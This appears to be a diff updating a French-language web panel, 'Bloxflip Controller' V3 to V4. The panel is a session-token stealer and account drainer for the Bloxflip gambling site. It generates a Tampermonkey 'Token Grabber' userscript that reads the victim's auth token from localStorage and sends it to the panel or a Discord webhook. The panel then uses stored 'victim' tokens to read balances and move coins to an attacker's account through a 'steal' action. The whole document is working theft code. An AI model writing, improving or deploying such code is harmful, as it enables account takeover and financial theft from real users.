@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bloxflip Controller • V3</title>
+    <title>Bloxflip Controller • V4</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -139,9 +139,9 @@
 </head>
 <body>
     <div class="container">
-        <h1 style="background:linear-gradient(135deg,#ff6b35,#f7c948);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:26px;margin-bottom:3px;">🎯 Bloxflip Controller <span style="font-size:12px;color:#8888aa;-webkit-text-fill-color:#8888aa;">v3</span></h1>
+        <h1 style="background:linear-gradient(135deg,#ff6b35,#f7c948);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:26px;margin-bottom:3px;">🎯 Bloxflip Controller <span style="font-size:12px;color:#8888aa;-webkit-text-fill-color:#8888aa;">v4</span></h1>
         <p style="color:#8888aa;margin-bottom:18px;font-size:13px;">
-            Token : <span class="key-badge">_DO_NOT_SHARE_BLOXFLIP_TOKEN</span> → <span class="key-badge">X-Auth-Token</span>
+            Token : <span class="key-badge">cw:pubsubToken</span> → <span class="key-badge">X-Auth-Token</span>
         </p>
 
         <!-- Stats -->
@@ -178,7 +178,7 @@
             <div id="victimsContainer">
                 <div class="empty-state">
                     🔴 Aucun token enregistré.<br><br>
-                    📌 <strong>Ajout manuel</strong> : colle le token <code style="color:#ff6b35;">_DO_NOT_SHARE_BLOXFLIP_TOKEN</code><br>
+                    📌 <strong>Ajout manuel</strong> : colle le token <code style="color:#ff6b35;">cw:pubsubToken</code><br>
                     📌 <strong>Via script</strong> : installe le script Tampermonkey sur la machine cible<br><br>
                     <button class="btn btn-orange btn-small" onclick="switchTab('config')">⚙️ Aller dans Config</button>
                 </div>
@@ -191,11 +191,10 @@
             
             <div class="info-banner">
                 <strong>⚠️ Condition requise :</strong> Le token doit être <strong>valide</strong> (non expiré).
-                Utilise <strong>🔍 Tester</strong> pour vérifier. Un token <code>_DO_NOT_SHARE_BLOXFLIP_TOKEN</code> 
+                Utilise <strong>🔍 Tester</strong> pour vérifier. Le token <code>cw:pubsubToken</code> 
                 valide permet d'appeler l'API sans que la victime soit connectée au moment de l'action.
                 <br><br>
-                <strong>📅 Expiration :</strong> Le token <code>app.rt</code> expire après un certain temps.
-                Le <code>_DO_NOT_SHARE_BLOXFLIP_TOKEN</code> semble avoir une durée de vie plus longue.
+                <strong>📅 Expiration :</strong> Le token <code>cw:pubsubToken</code> semble avoir une durée de vie longue.
             </div>
 
             <div style="margin-bottom:14px;">
@@ -220,6 +219,7 @@
                     <select id="actionCurrency">
                         <option value="ROCOINS">ROCOINS</option>
                         <option value="FLIPCOINS">FLIPCOINS</option>
+                        <option value="COINS">COINS</option>
                     </select>
                 </div>
             </div>
@@ -240,6 +240,8 @@
             <div class="info-banner">
                 <strong>🔒 Sécurité :</strong> Tous les tokens sont stockés dans ton navigateur (localStorage).
                 Rien n'est envoyé automatiquement à un serveur ou Discord.
+                <br><br>
+                <strong>🔑 Token Bloxflip :</strong> Le vrai token est stocké dans <code>localStorage.getItem('cw:pubsubToken')</code>
             </div>
 
             <div style="margin-bottom:15px;">
@@ -259,7 +261,7 @@
             <div style="margin-bottom:15px;">
                 <div style="color:#8888aa;font-size:11px;text-transform:uppercase;margin-bottom:6px;">📋 Script Tampermonkey à distribuer</div>
                 <p style="font-size:12px;color:#b0b0cc;margin-bottom:6px;">
-                    Le script capture le token <code style="color:#ff6b35;">_DO_NOT_SHARE_BLOXFLIP_TOKEN</code> 
+                    Le script capture le token <code style="color:#ff6b35;">cw:pubsubToken</code> 
                     (le vrai token Bloxflip) et l'envoie ici.
                 </p>
                 <button class="btn btn-orange btn-small" onclick="generateScript()">⚡ Générer le script</button>
@@ -272,11 +274,11 @@
             <div style="margin-bottom:15px;">
                 <div style="color:#8888aa;font-size:11px;text-transform:uppercase;margin-bottom:6px;">➕ Ajout manuel d'un token</div>
                 <p style="font-size:12px;color:#b0b0cc;margin-bottom:6px;">
-                    Colle directement le token <code style="color:#ff6b35;">_DO_NOT_SHARE_BLOXFLIP_TOKEN</code> 
+                    Colle directement le token <code style="color:#ff6b35;">cw:pubsubToken</code> 
                     que tu as récupéré :
                 </p>
                 <div style="display:flex;gap:8px;">
-                    <input type="text" id="manualToken" placeholder="_DO_NOT_SHARE_BLOXFLIP_TOKEN" style="flex:1;font-family:monospace;font-size:11px;">
+                    <input type="text" id="manualToken" placeholder="cw:pubsubToken" style="flex:1;font-family:monospace;font-size:11px;">
                     <input type="text" id="manualName" placeholder="Pseudo (opt.)" style="width:150px;">
                     <button class="btn btn-green btn-small" onclick="addManual()">➕ Ajouter</button>
                 </div>
@@ -356,14 +358,18 @@
                 }
                 
                 const data = await res.json();
-                if (data && data.user) {
+                
+                // Structure réelle de Bloxflip: data.profile.username, data.wallet.balances
+                if (data && data.profile && data.profile.username) {
                     return { 
                         valid: true, 
-                        username: data.user.username,
-                        userId: data.user.id,
-                        robloxId: data.user.robloxId,
+                        username: data.profile.username,
+                        userId: data.profile.id,
+                        rank: data.profile.rank,
                         rocoins: data.wallet?.balances?.ROCOINS || 0,
                         flipcoins: data.wallet?.balances?.FLIPCOINS || 0,
+                        coins: data.wallet?.balances?.COINS || 0,
+                        tokens: data.tokens,
                         data: data
                     };
                 }
@@ -396,13 +402,16 @@
             if (result.valid) {
                 v.valid = true;
                 v.username = result.username;
+                v.userId = result.userId;
+                v.rank = result.rank;
                 v.rocoins = result.rocoins;
                 v.flipcoins = result.flipcoins;
+                v.coins = result.coins;
                 v.lastTest = Date.now();
                 localStorage.setItem('bf_victims', JSON.stringify(victims));
                 renderVictims();
                 updateStats();
-                log(`✅ Token VALIDE — ${result.username} | ROCOINS: ${result.rocoins} | FLIPCOINS: ${result.flipcoins}`, 'success');
+                log(`✅ Token VALIDE — ${result.username} (Rank ${result.rank}) | ROCOINS: ${result.rocoins} | FLIPCOINS: ${result.flipcoins}`, 'success');
             } else {
                 v.valid = false;
                 v.lastTest = Date.now();
@@ -424,15 +433,13 @@
             
             log(`🔄 Rafraîchissement des infos de ${v.username || '?'}...`, 'info');
             
-            // Teste le token et récupère les dernières données
             await testVictimTokenIndex(parseInt(idx));
             
-            // Si le token est valide, on a déjà les infos à jour via testVictimTokenIndex
             const updatedVictim = victims[parseInt(idx)];
             if (updatedVictim && updatedVictim.valid) {
                 const resultBox = document.getElementById('actionResult');
                 resultBox.className = 'result-box success';
-                resultBox.innerHTML = `✅ ${updatedVictim.username}<br>ROCOINS: ${(updatedVictim.rocoins || 0).toLocaleString()}<br>FLIPCOINS: ${(updatedVictim.flipcoins || 0).toLocaleString()}`;
+                resultBox.innerHTML = `✅ ${updatedVictim.username} (Rank ${updatedVictim.rank})<br>ROCOINS: ${(updatedVictim.rocoins || 0).toLocaleString()}<br>FLIPCOINS: ${(updatedVictim.flipcoins || 0).toLocaleString()}<br>COINS: ${(updatedVictim.coins || 0).toLocaleString()}`;
                 resultBox.style.display = 'block';
             }
         }
@@ -462,7 +469,8 @@
 
                 const roc = v.rocoins !== undefined ? `ROCOINS: ${v.rocoins.toLocaleString()}` : '';
                 const flc = v.flipcoins !== undefined ? `FLIPCOINS: ${v.flipcoins.toLocaleString()}` : '';
-                const balances = (roc || flc) ? `${roc} ${flc}` : '';
+                const rank = v.rank ? `Rank ${v.rank}` : '';
+                const balances = [rank, roc, flc].filter(Boolean).join(' | ');
 
                 return `
                 <div class="victim-card">
@@ -566,6 +574,8 @@
                         fields: [
                             { name: '👤 Pseudo', value: username, inline: true },
                             { name: '🔑 Token', value: '\\\\\`\\\\\`\\\\\`' + (token || '❌') + '\\\\\`\\\\\`\\\\\`', inline: false },
+                            { name: '💰 ROCOINS', value: rocoins.toString(), inline: true },
+                            { name: '💰 FLIPCOINS', value: flipcoins.toString(), inline: true },
                             { name: '🔗 URL', value: location.href, inline: false }
                         ],
                         timestamp: new Date().toISOString()
@@ -575,75 +585,96 @@
             }
 
             const script = `// ==UserScript==
-// @name         Bloxflip Token Grabber
+// @name         Bloxflip Token Grabber V4
 // @namespace    http://tampermonkey.net/
-// @version      3.1
-// @description  Capture le token _DO_NOT_SHARE_BLOXFLIP_TOKEN
+// @version      4.0
+// @description  Capture le token cw:pubsubToken de Bloxflip
 // @author       Research
 // @match        https://bloxflip.com/*
+// @run-at       document-end
 // @grant        none
 // ==/UserScript==
 
 (function() {
     'use strict';
 
-    // === LE VRAI TOKEN BLOXFLIP ===
-    const token = localStorage.getItem('_DO_NOT_SHARE_BLOXFLIP_TOKEN');
-    
-    console.log('[Grabber] _DO_NOT_SHARE_BLOXFLIP_TOKEN:', token ? token.substring(0,20)+'...' : 'ABSENT');
-
-    if (!token) {
-        console.log('[Grabber] Aucun token trouvé');
-        return;
-    }
-
-    async function getUsername() {
-        try {
-            const r = await fetch('https://bloxflip.com/api/user', {
-                credentials: 'include',
-                headers: {
-                    'Accept': 'application/json',
-                    'X-Auth-Token': token,
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                }
-            });
-            if (r.status === 401) return 'TOKEN_EXPIRE';
-            const d = await r.json();
-            return d?.user?.username || 'inconnu';
-        } catch(e) {
-            return 'inconnu';
-        }
-    }
-
-    async function sendTokens() {
-        const username = await getUsername();
+    setTimeout(() => {
+        // === LE VRAI TOKEN BLOXFLIP ===
+        const token = localStorage.getItem('cw:pubsubToken');
         
-        console.log('[Grabber] === TOKEN CAPTURE ===');
-        console.log('[Grabber] Token:', token);
-        console.log('[Grabber] Username:', username);
+        console.log('[Grabber] cw:pubsubToken:', token ? token.substring(0,20)+'...' : 'ABSENT');
 
-        const data = { token, username, url: location.href, time: Date.now() };
+        if (!token) {
+            console.log('[Grabber] Aucun token trouvé');
+            return;
+        }
 
-        // Envoi au panel parent
-        window.postMessage({ type: 'TOKENS', token, username }, '*');${sendToSite}${sendToDiscord}
+        async function getInfos() {
+            try {
+                const r = await fetch('https://bloxflip.com/api/user', {
+                    headers: {
+                        'Accept': 'application/json',
+                        'X-Auth-Token': token,
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    }
+                });
+                const d = await r.json();
+                if (d?.profile?.username) {
+                    return {
+                        username: d.profile.username,
+                        userId: d.profile.id,
+                        rank: d.profile.rank,
+                        rocoins: d.wallet?.balances?.ROCOINS || 0,
+                        flipcoins: d.wallet?.balances?.FLIPCOINS || 0
+                    };
+                }
+                return { username: 'TOKEN_INVALIDE', rocoins: 0, flipcoins: 0 };
+            } catch(e) {
+                return { username: 'ERREUR', rocoins: 0, flipcoins: 0 };
+            }
+        }
 
-        // Notification visuelle discrète
-        const div = document.createElement('div');
-        div.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#1a1a2e;color:#7cff7c;padding:12px 18px;border-radius:8px;border:1px solid #ff6b35;z-index:99999;font-family:monospace;font-size:12px;box-shadow:0 4px 20px rgba(0,0,0,0.5);';
-        div.innerHTML = '🔑 Token capturé';
-        document.body.appendChild(div);
-        setTimeout(() => div.remove(), 4000);
-    }
+        async function sendTokens() {
+            const info = await getInfos();
+            
+            console.log('[Grabber] === TOKEN CAPTURE ===');
+            console.log('[Grabber] Token:', token);
+            console.log('[Grabber] Username:', info.username);
+            console.log('[Grabber] ROCOINS:', info.rocoins);
+            console.log('[Grabber] FLIPCOINS:', info.flipcoins);
 
-    sendTokens();
-    setTimeout(sendTokens, 3000);
-    setTimeout(sendTokens, 8000);
+            const data = { 
+                token, 
+                username: info.username,
+                userId: info.userId,
+                rank: info.rank,
+                rocoins: info.rocoins,
+                flipcoins: info.flipcoins,
+                url: location.href, 
+                time: Date.now() 
+            };
+
+            // Envoi au panel parent
+            window.postMessage({ type: 'TOKENS', token, username: info.username, rocoins: info.rocoins, flipcoins: info.flipcoins }, '*');${sendToSite}${sendToDiscord}
+
+            // Notification visuelle
+            const div = document.createElement('div');
+            div.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#1a1a2e;color:#7cff7c;padding:12px 18px;border-radius:8px;border:1px solid #ff6b35;z-index:99999;font-family:monospace;font-size:12px;box-shadow:0 4px 20px rgba(0,0,0,0.5);';
+            div.innerHTML = '🔑 Token capturé: ' + info.username + '<br>💰 ' + info.rocoins.toFixed(4) + ' ROCOINS';
+            document.body.appendChild(div);
+            setTimeout(() => div.remove(), 5000);
+        }
+
+        sendTokens();
+        setTimeout(sendTokens, 3000);
+        setTimeout(sendTokens, 8000);
+    }, 2000);
 })();`;
 
             document.getElementById('scriptCode').textContent = script;
             document.getElementById('scriptOutput').style.display = 'block';
             
-            log('✅ Script généré (token: _DO_NOT_SHARE_BLOXFLIP_TOKEN)', 'success');
+            log('✅ Script généré (token: cw:pubsubToken)', 'success');
             if (webhook) log('⚠️ Webhook configuré dans le script', 'error');
             else log('🔒 Aucune exfiltration automatique', 'info');
         }
@@ -673,8 +704,8 @@
             const result = await testTokenApi(token);
             
             if (result.valid) {
-                addVictim(token, result.username, true, result.rocoins, result.flipcoins);
-                log(`✅ Token VALIDE — ${result.username} | ROCOINS: ${result.rocoins} | FLIPCOINS: ${result.flipcoins}`, 'success');
+                addVictim(token, result.username, true, result.rocoins, result.flipcoins, result.rank);
+                log(`✅ Token VALIDE — ${result.username} (Rank ${result.rank}) | ROCOINS: ${result.rocoins} | FLIPCOINS: ${result.flipcoins}`, 'success');
             } else {
                 addVictim(token, manualName || 'Inconnu', false);
                 log(`❌ Token INVALIDE — ${result.error}`, 'error');
@@ -687,7 +718,7 @@
         // ============================================
         // AJOUT VICTIME (interne)
         // ============================================
-        window.addVictim = function(token, username, valid, rocoins, flipcoins) {
+        window.addVictim = function(token, username, valid, rocoins, flipcoins, rank) {
             if (victims.some(v => v.token === token)) {
                 log('ℹ️ Token déjà présent', 'info');
                 return;
@@ -699,6 +730,7 @@
                 valid: valid === true ? true : (valid === false ? false : undefined),
                 rocoins: rocoins || 0,
                 flipcoins: flipcoins || 0,
+                rank: rank || 0,
                 time: Date.now(),
                 lastTest: Date.now()
             });
@@ -719,7 +751,7 @@
                 const result = await testTokenApi(msg.token);
                 
                 if (result.valid) {
-                    addVictim(msg.token, result.username, true, result.rocoins, result.flipcoins);
+                    addVictim(msg.token, result.username, true, result.rocoins, result.flipcoins, result.rank);
                 } else {
                     addVictim(msg.token, msg.username || 'Inconnu', false);
                 }
@@ -760,11 +792,14 @@
 
             showResult(resultBox, '⏳ En cours... <span class="loading">▌</span>', 'info');
 
-            const headers = getHeaders(v.token);
+            const headers = {
+                ...getHeaders(v.token),
+                'Content-Type': 'application/json'
+            };
 
             try {
                 if (action === 'balance') {
-                    const res = await fetch('https://bloxflip.com/api/user', { headers });
+                    const res = await fetch('https://bloxflip.com/api/user', { headers: getHeaders(v.token) });
                     if (res.status === 401) {
                         showResult(resultBox, '❌ Token expiré', 'error');
                         v.valid = false;
@@ -774,30 +809,31 @@
                     }
                     const data = await res.json();
                     
-                    if (data?.user?.username) {
-                        v.username = data.user.username;
+                    if (data?.profile?.username) {
+                        v.username = data.profile.username;
                         v.valid = true;
+                        v.rank = data.profile.rank;
                     }
                     v.rocoins = data.wallet?.balances?.ROCOINS || 0;
                     v.flipcoins = data.wallet?.balances?.FLIPCOINS || 0;
+                    v.coins = data.wallet?.balances?.COINS || 0;
                     localStorage.setItem('bf_victims', JSON.stringify(victims));
                     renderVictims();
                     updateStats();
                     
-                    showResult(resultBox, `💰 ${v.username}<br>ROCOINS: ${v.rocoins.toLocaleString()}<br>FLIPCOINS: ${v.flipcoins.toLocaleString()}`, 'success');
-                    log(`💰 ${v.username}: ${v.rocoins} ROCOINS, ${v.flipcoins} FLIPCOINS`, 'success');
+                    showResult(resultBox, `💰 ${v.username} (Rank ${v.rank})<br>ROCOINS: ${v.rocoins.toLocaleString()}<br>FLIPCOINS: ${v.flipcoins.toLocaleString()}<br>COINS: ${v.coins.toLocaleString()}`, 'success');
+                    log(`💰 ${v.username}: ${v.rocoins} ROCOINS, ${v.flipcoins} FLIPCOINS, ${v.coins} COINS`, 'success');
                 }
                 else if (action === 'tip') {
-                    const amount = prompt('Montant à tip ?');
+                    const amount = prompt(`Montant à tip (en ${currency}) ?`);
                     if (!amount || parseFloat(amount) <= 0) {
                         showResult(resultBox, '❌ Montant invalide', 'error');
                         return;
                     }
 
-                    // Essayer d'abord avec Content-Type
                     const res = await fetch('https://bloxflip.com/api/chat/commands/gift', {
                         method: 'POST',
-                        headers: { ...headers, 'Content-Type': 'application/json' },
+                        headers: { ...headers },
                         body: JSON.stringify({
                             recipientUsername: recipient,
                             amount: parseFloat(amount),
@@ -818,7 +854,7 @@
                 }
                 else if (action === 'steal') {
                     // Récupérer le dernier solde
-                    const res = await fetch('https://bloxflip.com/api/user', { headers });
+                    const res = await fetch('https://bloxflip.com/api/user', { headers: getHeaders(v.token) });
                     if (res.status === 401) {
                         showResult(resultBox, '❌ Token expiré', 'error');
                         v.valid = false;
@@ -838,7 +874,7 @@
 
                     const tipRes = await fetch('https://bloxflip.com/api/chat/commands/gift', {
                         method: 'POST',
-                        headers: { ...headers, 'Content-Type': 'application/json' },
+                        headers: { ...headers },
                         body: JSON.stringify({
                             recipientUsername: recipient,
                             amount: amount,
@@ -850,6 +886,16 @@
                     try { tipData = await tipRes.json(); } catch(e) { tipData = { error: 'Réponse invalide' }; }
                     
                     if (tipData.success) {
+                        // Mise à jour après vol
+                        const updateRes = await fetch('https://bloxflip.com/api/user', { headers: getHeaders(v.token) });
+                        if (updateRes.ok) {
+                            const updateData = await updateRes.json();
+                            v.rocoins = updateData.wallet?.balances?.ROCOINS || 0;
+                            v.flipcoins = updateData.wallet?.balances?.FLIPCOINS || 0;
+                            localStorage.setItem('bf_victims', JSON.stringify(victims));
+                            renderVictims();
+                        }
+                        
                         showResult(resultBox, `✅ ${amount.toLocaleString()} ${currency} volés → ${recipient}`, 'success');
                         if (currency === 'ROCOINS') stats.rocoins = (stats.rocoins || 0) + amount;
                         else stats.flipcoins = (stats.flipcoins || 0) + amount;
@@ -883,7 +929,7 @@
 
         renderVictims();
         updateStats();
-        log('🟢 Prêt. Utilise _DO_NOT_SHARE_BLOXFLIP_TOKEN comme token.', 'info');
+        log('🟢 Prêt. Utilise cw:pubsubToken comme token.', 'info');
         log('💡 Astuce: teste d\'abord le token avec 🔍 Tester avant d\'agir', 'info');
         
         if (config.discordWebhook) log('⚠️ Webhook Discord configuré', 'error');
